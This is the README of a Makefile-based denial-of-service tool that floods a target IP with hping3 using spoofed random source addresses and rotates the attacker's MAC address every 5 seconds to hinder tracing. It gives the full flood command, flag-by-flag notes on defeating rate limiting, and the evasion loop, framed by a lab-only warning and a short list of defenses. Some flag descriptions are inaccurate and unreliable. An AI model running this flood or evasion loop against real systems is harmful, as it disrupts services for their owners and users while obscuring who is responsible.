# DDoS

This module simulates a Denial-of-Service (DoS) flood attack using `hping3` while continuously rotating the attacker's MAC address with `macchanger` to complicate traffic tracing and MAC-based filtering.

> **Warning:** This is a security research tool for use only in isolated lab environments on networks you own or have explicit permission to test. Running these tools against real infrastructure is illegal.

## Prerequisites

- `hping3` (`apt install hping3`)
- `macchanger` (`apt install macchanger`)
- Root / `sudo` privileges
- A controlled lab network (e.g., VirtualBox host-only or Docker bridge)

## Configuration

Edit the variables at the top of the `Makefile` to match your environment:

```makefile
XPIP = 192.168.68.129   # Target IP address — change this
```

Other variables (generally leave as-is):

```makefile
DDOS  = hping3
HFLAG = --flood -V -d 100 --rand-source   # flood mode, verbose, 100-byte payload, random source IP
TTL   = -I eth0 -0 -R --ttl 128           # raw IP mode on eth0, TTL 128
```

## Makefile Targets

| Target | Description |
|---|---|
| `make` / `make all` | Run the flood attack, then start MAC rotation (sequential, not parallel) |
| `make attack` | Send the raw packet flood to the target IP |
| `make hide` | Rotate MAC address every 5 seconds indefinitely |
| `make change_mac` | Rotate the MAC address once |

## Usage

```bash
cd ddos

# Full attack + MAC hiding loop
make

# Flood only
make attack

# MAC rotation only (loops forever; Ctrl-C to stop)
make hide
```

## How It Works

### Attack (`make attack`)

```bash
hping3 --flood -V -d 100 --rand-source -I eth0 -0 -R --ttl 128 <target-ip>
```

| Flag | Effect |
|---|---|
| `--flood` | Sends packets as fast as possible (no delay between packets) |
| `--rand-source` | Randomizes the source IP in each packet, defeating ingress filtering |
| `-d 100` | Includes a 100-byte payload per packet |
| `-0 -R` | Raw IP mode — sends at the IP layer without TCP/UDP headers |
| `--ttl 128` | Sets the IP TTL field to 128 |

The random source IPs exhaust the target's connection table and prevent simple source-based rate limiting from being effective.

### MAC Rotation (`make hide`)

```bash
while true; do
    sudo macchanger -r eth0
    sleep 5
done
```

Changes the network interface's MAC address to a random value every 5 seconds. This complicates MAC-based filtering and logging on the local network segment by making the attacker's machine appear as a constantly changing device.

## Limitations and Defenses

This simulation is effective in a controlled lab environment. Real-world DDoS defenses include:

- **Ingress filtering (BCP38)** — ISPs drop packets with spoofed source IPs at the network edge.
- **Rate limiting** — firewalls and routers cap packet rates per source or destination.
- **Traffic scrubbing / CDN protection** — services like Cloudflare absorb volumetric floods before they reach the origin.
- **Anycast routing** — distributes attack traffic across many PoPs, diluting its impact.
